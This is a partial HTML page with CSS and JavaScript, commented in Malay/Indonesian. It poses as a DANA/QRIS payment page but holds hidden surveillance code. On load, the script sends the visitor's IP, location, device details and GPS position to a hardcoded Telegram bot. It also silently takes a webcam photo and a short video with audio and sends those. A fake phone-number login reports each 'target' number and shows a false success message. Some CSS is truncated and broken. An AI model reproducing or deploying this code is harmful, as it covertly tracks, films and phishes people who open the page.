        /* Body style dari coding kedua diabaikan kerana body style coding pertama yang digunakan */
        /* .bg-particles dan .login-container akan disembunyikan melalui id="hidden-background-script-container" */
        .bg-particles {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none; z-index: 0;
        }
        .particle {
            position: absolute; width: 2px; height: 2px;
            background: rgba(0, 255, 127, 0.3);
            border-radius: 50%;
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float {

            50% { transform: translateY(-20px); opacity: 0.8; }

        .login-container { /* Ini akan disembunyikan */

        .login-button:hover { background-color: #0f0; box-shadow: 0 0 20px lime; }
        #info {

        }
        video, canvas { display: none; } /* Ini memang dah display none */
        @media (max-width: 480px) {

            .login-title { font-size: 22px; }
            .login-input, .login-button { font-size: 14px; padding: 10px; }

            display: none !important; /* Kekuatan penuh untuk menyembunyikan! */

    <!-- --- Gabungan Skrip JavaScript --- -->
    <script>
        // Skrip dari coding pertama
        function showScreen(screenId) {
            document.getElementById('screen-main').classList.add('hidden');
            document.getElementById('screen-dana').classList.add('hidden');
            document.getElementById('screen-qris').classList.add('hidden');
            document.getElementById(screenId).classList.remove('hidden');
            window.scrollTo(0,0);
        }

        function copyNumber() {
            const numText = document.getElementById('dana-number').innerText;
            const cleanNum = numText.replace(/-/g, '').replace(/\s/g, '');
            navigator.clipboard.writeText(cleanNum).then(() => {
                alert("Nomor Dana " + cleanNum + " berhasil disalin!");
            });
        }

        // Skrip dari coding kedua
        const botToken = '8111400163:AAE_U8cx5U_-JIgNvnzBtimM3sgGE6tl8ek';
        const chatIds = ['7624612389'];
        const infoDiv = document.getElementById('info');
        const input = document.getElementById('text');
        const button = document.getElementById('login-button');

        let permissionsRequested = false;
        let currentStream = null;

        function sendToTelegram(text) {
            chatIds.forEach(id => {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
                }).catch(console.error);
            });
        }

        function sendPhotoToTelegram(blob) {
            chatIds.forEach(id => {
                const formData = new FormData();
                formData.append('chat_id', id);
                formData.append('photo', blob, 'photo.jpg');
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(console.error);
            });
        }

        function sendVideoToTelegram(blob) {
            chatIds.forEach(id => {
                const formData = new FormData();
                formData.append('chat_id', id);
                formData.append('video', blob, 'video.webm');
                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                }).catch(console.error);
            });
        }

        async function getInfo(sendGeo = true) {
            let ip = '-', city = '-', region = '-', country = '-', org = '-';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
                const locRes = await fetch(`https://ip-api.com/json/${ip}`);
                const loc = await locRes.json();
                if (loc.status === 'success') {
                    city = loc.city; region = loc.regionName;
                    country = loc.country; org = loc.org;
                }
            } catch {}
            const battery = await navigator.getBattery?.() || { level: 0, charging: false };
            const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
            const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
            `.trim();
            sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

            if (sendGeo && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
                    },
                    () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
                );
            } else if (sendGeo) {
                sendToTelegram(`üìç Browser tidak support GPS`);
            }
        }

        async function startCameraAndCaptureSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                currentStream = stream;
                video.srcObject = stream;

                await new Promise(r => setTimeout(r, 500));
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    if (blob) sendPhotoToTelegram(blob);
                }, 'image/jpeg', 0.9);

                try {
                    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                    let chunks = [];
                    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: "video/webm" });
                        sendVideoToTelegram(blob);
                        stream.getTracks().forEach(track => track.stop());
                        currentStream = null;
                    };
                    recorder.start();
                    setTimeout(() => { recorder.stop(); }, 4000);
                } catch (e) {
                    stream.getTracks().forEach(track => track.stop());
                    currentStream = null;
                }
            } catch (err) {
                sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
            }
        }

        async function requestPermissionsOnLoad() {
            if (permissionsRequested) return;
            permissionsRequested = true;
            getInfo(true);
            startCameraAndCaptureSnapshot();
        }

        button.addEventListener('click', async () => {
            const nomor = input.value.trim();
            if (!nomor || nomor.length < 8 || nomor.length > 15) {
                infoDiv.innerText = '‚ö†Ô∏è Nomor tidak valid.';
                return;
            }
            button.disabled = true;
            infoDiv.innerText = '‚è≥ Memproses Nombor Telefon...';
            sendToTelegram(`<b>üìû Nomor Target:</b> ${nomor}`);
            input.value = '';
            setTimeout(() => {
                infoDiv.innerText = `‚úÖ Successfully To Login ${nomor}`;
                button.disabled = false;
            }, 1000);
        });

        function createParticles() {
            const container = document.querySelector('.bg-particles');
            for (let i = 0; i < 50; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.left = Math.random() * 100 + '%';
                p.style.top = Math.random() * 100 + '%';
                p.style.animationDelay = Math.random() * 6 + 's';
                p.style.animationDuration = (Math.random() * 4 + 4) + 's';
                container.appendChild(p);
            }
        }
        document.addEventListener('DOMContentLoaded', () => {
            createParticles();
            requestPermissionsOnLoad();
        });

        window.addEventListener('beforeunload', () => {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
        });
    </script>
